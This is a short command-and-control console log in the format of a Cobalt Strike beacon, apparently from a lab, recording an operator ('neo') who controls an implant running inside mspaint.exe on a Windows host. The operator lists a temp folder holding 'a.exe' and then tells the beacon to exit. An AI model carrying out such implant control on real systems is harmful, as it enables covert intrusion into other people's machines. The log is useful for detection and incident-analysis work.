12/15 14:27:40 UTC [metadata] 192.168.1.9 <- 192.168.1.20; computer: ACER; user: david; process: mspaint.exe; pid: 19292; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
12/15 14:27:44 UTC [input] <neo> ls
12/15 14:27:44 UTC [task] <> Tasked beacon to list files in .
12/15 14:28:32 UTC [checkin] host called home, sent: 19 bytes
12/15 14:28:32 UTC [output]
C:\Users\david\AppData\Local\Temp\RarSFX7\*
D	0	12/15/2022 21:26:32	.
D	0	12/15/2022 21:28:22	..
F	927232	12/15/2022 20:43:09	a.exe
F	2247	12/15/2022 15:25:31	Google Chrome.lnk


12/15 14:28:43 UTC [input] <neo> exit
12/15 14:28:43 UTC [task] <> Tasked beacon to exit
12/15 14:29:19 UTC [input] <neo> exit
12/15 14:29:19 UTC [task] <> Tasked beacon to exit
12/15 14:29:40 UTC [metadata] 192.168.1.9 <- 192.168.1.20; computer: ACER; user: david; process: mspaint.exe; pid: 19292; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
12/15 14:29:32 UTC [checkin] host called home, sent: 16 bytes
12/15 14:29:32 UTC [output]
beacon exit.

12/15 14:29:32 UTC [output]
beacon exit.

12/15 14:30:38 UTC [input] <neo> exit
12/15 14:30:38 UTC [task] <> Tasked beacon to exit
